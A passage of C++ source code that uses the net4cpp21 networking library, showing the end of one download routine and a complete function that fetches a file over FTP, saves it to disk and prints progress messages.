		if(sout.bTag() && iPercent!=iPrePercent){
			slen=sprintf(s,"Receiving data: %d/%d bytes, %d%% \r",recvBytes,lsize,iPercent);
			sout.print(s,slen); iPrePercent=iPercent;
		}
	}//?while(...
	slen=sprintf(s,"Success to download file, save as %s\r\n",strSaveas);
	sout.print(s,slen); ::fclose(fp); 
	return TRUE;
}
#include "net4cpp21/include/ftpclnt.h"
BOOL downfile_ftp(const char *ftpurl,const char *strSaveas,clsOutput &sout)
{
	char s[128]; int slen;
	MyService *psvr=MyService::GetService();
	socketBase *pevent=(psvr)?psvr->GetSockEvent():NULL;
	ftpClient ftpc; ftpc.setParent(pevent);
	SOCKSRESULT sr=ftpc.ConnectSvr(ftpurl);
	if(sr!=SOCKSERR_OK){ sout.print("Failed to access url!\r\n",0); return FALSE; }
	const char *filepath=strchr(ftpurl+6,'/');
	long lsize=ftpc.FileSize(filepath);
	if(lsize<0){ sout.print("Failed to access file!\r\n",0); return FALSE; }

	if(lsize<10240)
		slen=sprintf(s,"success to access,file size=%d Bytes\r\n",lsize);
	else slen=sprintf(s,"success to access,file size=%d KBytes\r\n",lsize/1024);
	sout.print(s,slen);
	
	FILE *fp=::fopen(strSaveas,"wb");
	if(fp==NULL){ sout.print("Failed to open file for writing!\r\n",0); return FALSE; }
	
	socketTCP datasock;
	sr=ftpc.GetDatasock(filepath,datasock,true);
	if( sr!=SOCKSERR_OK ){ sout.print("Failed to create data socket!\r\n",0);
		::fclose(fp); return FALSE;
	}

	char buf[4096]; unsigned long recvBytes=0;
	long iPercent,iPrePercent=-1;
	while(recvBytes<(unsigned long)lsize)
	{
		int iret=datasock.checkSocket(SCHECKTIMEOUT,SOCKS_OP_READ);
		if(iret<0) break; 
		if(iret==0) continue;
		iret=datasock.Receive(buf,4096,-1);
		if(iret<0) break; else recvBytes+=iret;
		::fwrite(buf,sizeof(char),iret,fp);
		iPercent=recvBytes*100/lsize;
		if(sout.bTag() && iPercent!=iPrePercent){
			slen=sprintf(s,"Receiving data: %d/%d bytes, %d%% \r",recvBytes,lsize,iPercent);
			sout.print(s,slen); iPrePercent=iPercent;
		}
	}//?while(...
	::fclose(fp); datasock.Close();
	slen=sprintf(s,"Success to download file, save as %s\r\n",strSaveas);
	sout.print(s,slen);
	return TRUE;
}

